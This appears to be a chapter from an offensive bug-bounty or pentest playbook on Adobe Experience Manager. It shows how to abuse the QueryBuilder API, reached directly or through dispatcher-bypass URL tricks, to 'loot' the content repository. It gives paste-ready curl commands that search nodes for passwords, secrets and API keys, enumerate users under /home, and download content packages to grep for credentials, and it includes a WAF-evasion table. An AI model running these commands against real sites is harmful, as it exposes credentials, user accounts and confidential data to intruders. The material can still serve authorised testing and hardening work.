# 5 — QueryBuilder loot (search the content DB)

**Goal:** Once you can reach QueryBuilder (direct or bypass), **search the tree** like a database.

If QueryBuilder is dead, use `.1.json` / `.3.json` dumps instead (same file, bottom).

---

## Signal

You already got JSON that looks like:

```json
{"success":true,"results":3,"total":3,"hits":[...]}
```

or node properties with `"jcr:primaryType"`.

---

## Why

QueryBuilder is AEM’s **search API** for the JCR.

- Authors use it to find content.  
- You use it to find **secrets, users, packages, writable nodes**.  

It is “DefaultGetServlet on steroids”: not just one folder — **queries**.

---

## Paste kit — basic searches

Set `QB` to whatever URL shape works (plain or bypass).

```bash
T="https://TARGET"
# EXAMPLES — pick the one that worked in 04:
QB="$T/bin/querybuilder.json"
# QB="$T/bin/querybuilder.json;x='a/b.css/c'"
# QB="$T/graphql/execute.json/..%2f../bin/querybuilder.json"

# List a little under /content
curl -sk -G "$QB" \
  --data-urlencode "path=/content" \
  --data-urlencode "p.limit=20"

# Under /etc
curl -sk -G "$QB" \
  --data-urlencode "path=/etc" \
  --data-urlencode "p.limit=20"

# Users area
curl -sk -G "$QB" \
  --data-urlencode "path=/home" \
  --data-urlencode "p.limit=20"

# Packages
curl -sk -G "$QB" \
  --data-urlencode "path=/etc/packages" \
  --data-urlencode "p.limit=50"
```

---

## Paste kit — find interesting node types

```bash
# Pages
curl -sk -G "$QB" \
  --data-urlencode "type=cq:Page" \
  --data-urlencode "p.limit=20"

# Files / assets
curl -sk -G "$QB" \
  --data-urlencode "type=dam:Asset" \
  --data-urlencode "path=/content/dam" \
  --data-urlencode "p.limit=20"

# Anything with "password" in a property name/value (noisy but useful)
curl -sk -G "$QB" \
  --data-urlencode "fulltext=password" \
  --data-urlencode "p.limit=20"

curl -sk -G "$QB" \
  --data-urlencode "fulltext=secret" \
  --data-urlencode "p.limit=20"

curl -sk -G "$QB" \
  --data-urlencode "fulltext=api_key" \
  --data-urlencode "p.limit=20"
```

---

## Paste kit — property filters (classic hunter queries)

```bash
# Nodes with a property named password (syntax can vary by version)
curl -sk -G "$QB" \
  --data-urlencode "property=password" \
  --data-urlencode "property.operation=exists" \
  --data-urlencode "p.limit=20"

# sling:resourceType hunting (find Forms containers, etc.)
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=20"
```

---

## Paste kit — walk carefully with depth JSON (no QB)

When QueryBuilder blocked but DefaultGET works:

```bash
T="https://TARGET"

# Top levels
for p in /content /content/dam /etc /etc/packages /home /apps /conf /var; do
  echo "===== $p ====="
  curl -sk -o /tmp/n.json -w "code=%{http_code} size=%{size_download}\n" "$T${p}.1.json"
  head -c 250 /tmp/n.json; echo
done

# Drill one interesting folder
curl -sk "$T/content.2.json" -o content-2.json
curl -sk "$T/etc/packages.2.json" -o packages-2.json
```

**Tip (Jim Green):** use `.1.json` / `.2.json` first.  
`.infinity.json` can hit limits / alerts / 10k node caps.

---

## What “good loot” looks like

| Finding | Why it matters |
|---------|----------------|
| `/etc/packages/*.zip` paths | Source + configs + sometimes creds |
| User nodes under `/home` | Account enum |
| Connection strings / keys in properties | Direct impact |
| Internal hostnames in content | Pivot map |
| “Confidential” PDFs under DAM | Business impact |
| Writable paths for anonymous | Next step: write → more bugs |

---

## Jim Green story (remember the goal)

QueryBuilder → `/etc/packages` → downloaded customer package →  
**source code + MySQL password + Akamai keys**.

So after any QB access:

```text
1) path=/etc/packages
2) download any .zip you can
3) unzip offline, grep for password, key, secret, jdbc, aws
```

See [07-content-packages.md](./07-content-packages.md).

---

## Variations

| Constraint | Move |
|------------|------|
| `p.limit` max small | Page with `p.offset` if supported; or narrow `path=` |
| Only feed servlet works | `/bin/querybuilder.feed` — less props, still paths |
| WAF on `querybuilder` word | Use bypass shapes; try GQL if present |
| Time-box 10 min | `/content`, `/etc/packages`, `fulltext=password` only |

---

## Done when

- [ ] Saved JSON samples proving access  
- [ ] Listed high-value paths  
- [ ] Started package/content mining  

**Next:** [06-selectors-gadgets.md](./06-selectors-gadgets.md) or [07-content-packages.md](./07-content-packages.md)
